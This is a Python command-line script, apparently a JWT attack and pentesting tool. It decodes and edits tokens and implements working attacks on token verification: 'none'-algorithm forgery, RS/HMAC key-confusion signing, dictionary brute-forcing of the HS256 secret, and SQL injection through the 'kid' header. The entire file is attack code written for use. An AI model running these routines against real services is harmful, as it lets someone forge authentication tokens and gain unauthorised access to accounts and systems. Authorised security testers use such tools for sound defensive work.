import base64
import hashlib
import json
import sys

import click
import os.path
from os import path
import hmac

from texttable import Texttable


def signature(jwtJson, key):
    if jwtJson["header"]["alg"] == "HS256":
        jwt = encodeJwt(jwtJson)
        signature = hmac.new(key.encode(), jwt.encode(), hashlib.sha256).digest()
        newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
        return jwt + "." + newSig


def encodedToJson(encodedString):
    decode = base64.b64decode(encodedString + '=' * (-len(encodedString) % 4))
    return json.loads(decode)


def encodeJwt(jwtJson):
    headerEncoded = base64.urlsafe_b64encode(
        json.dumps(jwtJson["header"], separators=(',', ':')).encode('UTF-8')).decode('UTF-8').strip('=')
    payloadEncoded = base64.urlsafe_b64encode(
        json.dumps(jwtJson["payload"], separators=(',', ':')).encode('UTF-8')).decode('UTF-8').strip('=')
    return headerEncoded + "." + payloadEncoded


def jwtToJson(jwt):
    jwtSplit = jwt.split('.')
    header = jwtSplit[0]
    payload = jwtSplit[1]
    signature = jwtSplit[2]
    headerJson = encodedToJson(header)
    payloadJson = encodedToJson(payload)
    return {"header": headerJson, "payload": payloadJson, "signature": signature}


def printDecoded(jwt):
    jwtJson = jwtToJson(jwt)
    click.echo(f"Header: {jwtJson['header']}")
    click.echo(f"Payload: {jwtJson['payload']}")
    click.echo(f"Signature: {jwtJson['signature']}")
    jwtEncoded = encodeJwt(jwtJson)
    click.echo(jwtEncoded)


def changeAlg(jwtJson, algo):
    jwtJson["header"]["alg"] = algo
    return jwtJson


def changePayload(jwtJson, payload):
    jwtJson["payload"] = payload
    return jwtJson


def checkHmac(jwtJson, file):
    jwtJson = changeAlg(jwtJson, "HS256")
    return signature(jwtJson, open(file).read())


def bruteforceDict(jwt, fileName):
    jwtJson = jwtToJson(jwt)
    with open(fileName, 'r') as file:
        allPassword = [line.rstrip() for line in file]
    file.close()
    table = Texttable()
    table.set_cols_align(["c", "m", "c"])
    table.set_cols_valign(["m", "m", "m"])
    table.set_max_width(0)
    table.header(["Passord", "Key", "valid Key"])
    for password in allPassword:
        newJwt = signature(jwtJson, password)
        newSig = newJwt.split('.')[2]
        table.add_row([password, signature(jwtJson, password), "yes" if newSig == jwt.split('.')[2] else "no"])
    print(table.draw() + "\n")


def addheader(jwtJson, header):
    for headerKey in header.keys():
        jwtJson["header"][headerKey] = header[headerKey]
    return jwtJson


def injectSqlKid(jwt, injection):
    jwtJson = jwtToJson(jwt)
    jwtJson["header"]["kid"] = injection
    return signature(jwtJson, "")


def addpayload(jwtJson, payload):
    for payloadKey in payload.keys():
        jwtJson["payload"][payloadKey] = payload[payloadKey]
    return jwtJson


@click.command()
@click.argument('jwt')
@click.option("--print", is_flag=True, help="Print Decoded JWT")
@click.option("--payload", "-p", help="New payload json format")
@click.option("--add-header", multiple=True)
@click.option("--add-payload", multiple=True)
@click.option("--sign")
@click.option("--none-vulnerability", '-none', is_flag=True, help="Check None Alg vulnerability")
@click.option("--hmac", help="Check RS/HMAC Alg vulnerability")
@click.option("--bruteforce", help="Bruteforce to guess th secret used to sign the token")
@click.option("--verify")
@click.option("--kid", help="Kid Injection sql")
def main(jwt, print, payload, add_header, add_payload, sign, none_vulnerability, hmac, bruteforce, verify,  kid):
    if payload:
        jwtJson = changePayload(jwtToJson(jwt), json.loads(payload))
        jwt = encodeJwt(jwtJson) + "." + jwtJson["signature"]
    if add_payload:
        payloadDict = dict()
        for payload in add_payload:
            newStr = payload.split("=")
            payloadDict[newStr[0]] = newStr[1]
        jwtJson = addpayload(jwtToJson(jwt), payloadDict)
        jwt = encodeJwt(jwtJson) + "." + jwtJson["signature"]

    if add_header:
        headerDict = dict()
        for header in add_header:
            newStr = header.split("=")
            headerDict[newStr[0]] = newStr[1]
        jwtJson = addheader(jwtToJson(jwt), headerDict)
        jwt = encodeJwt(jwtJson) + "." + jwtJson["signature"]
    if kid:
        jwt = injectSqlKid(jwt, kid)
    if bruteforce:
        if path.exists(bruteforce):
            bruteforceDict(jwt, bruteforce)
            sys.exit()
        else:
            click.echo("File not found")
            sys.exit()
    if hmac:
        if path.exists(hmac):
            jwt = checkHmac(jwtToJson(jwt), hmac)
            click.echo(f"\nnew JWT: {jwt}")
        else:
            click.echo("File not found")
            sys.exit()
    if none_vulnerability:
        jwtJson = changeAlg(jwtToJson(jwt), "none")
        jwt = encodeJwt(jwtJson) + "."
        click.echo(jwt)
        sys.exit()
    if sign:
        jwt = signature(jwtToJson(jwt), sign)
    if verify:
        newJwt = signature(jwtToJson(jwt), verify)
        click.echo("yes" if newJwt.split('.')[2] == jwt.split('.')[2] else "no")
        sys.exit()
    if print:
        printDecoded(jwt)
        sys.exit()
    click.echo(jwt)


if __name__ == '__main__':
    main()
